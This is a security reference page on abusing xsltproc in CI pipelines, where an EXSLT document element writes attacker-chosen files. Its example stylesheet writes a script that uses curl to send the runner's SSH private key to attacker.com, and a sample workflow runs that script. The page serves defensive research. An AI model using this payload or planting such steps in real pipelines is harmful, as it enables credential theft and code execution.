---
layout: tool
title: xsltproc
parent: Living Off The Pipeline
nav_order: 33
---

## Living Off The Pipeline - xsltproc

`xsltproc` is a command-line tool for applying XSLT stylesheets to XML documents. It can be abused as a "Living Off The Pipeline" (LOTP) "Setup Gadget" because the XSLT language supports extensions that allow for writing arbitrary files to the filesystem.

### First-Order LOTP Gadget

`xsltproc` is a **First-Order LOTP Gadget**. It provides an "Arbitrary File Write" primitive when it processes a malicious XSLT stylesheet.

#### Malicious Primitive: Arbitrary File Write

The attack vector is the `exsl:document` element, which is part of the EXSLT standard and is supported by `xsltproc`. This element is intended to allow a single transformation to create multiple output files. However, an attacker can abuse the `href` attribute to specify an arbitrary file path, including path traversal sequences (`../`).

When `xsltproc` processes a stylesheet containing a malicious `exsl:document` element, it will write attacker-controlled content to the specified location on the CI runner's filesystem. This can be used to create a malicious script, overwrite a configuration file, or poison a file like `~/.bashrc` to set up a later RCE.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request containing a malicious XSLT stylesheet.
    ```xml
    <!-- transform.xsl -->
    <xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:exsl="http://exslt.org/common"
      extension-element-prefixes="exsl">
      <xsl:template match="/">
        <!-- This element writes a malicious script to a predictable location -->
        <exsl:document href="/tmp/pwn.sh" method="text">
          <xsl:text>curl --data-binary @$HOME/.ssh/id_rsa http://attacker.com/</xsl:text>
        </exsl:document>
      </xsl:template>
    </xsl:stylesheet>
    ```

2.  **Vulnerable Workflow:** The pipeline contains two steps: one to transform an XML file, and a later one that executes a script from the temporary directory.
    ```yaml
    - name: Process XML data
      run: xsltproc transform.xsl data.xml

    - name: Run utility script
      run: bash /tmp/pwn.sh
    ```

3.  **Execution:**
    *   **Setup:** The `xsltproc` command runs, processing the attacker's stylesheet. The `exsl:document` element creates the `/tmp/pwn.sh` file containing the attacker's payload.
    *   **Execution:** The `Run utility script` step executes the newly created malicious script, leading to RCE.

### References

*   [EXSLT `document` element](http://www.exslt.org/exsl/elements/document/index.html)
*   `xsltproc` man page
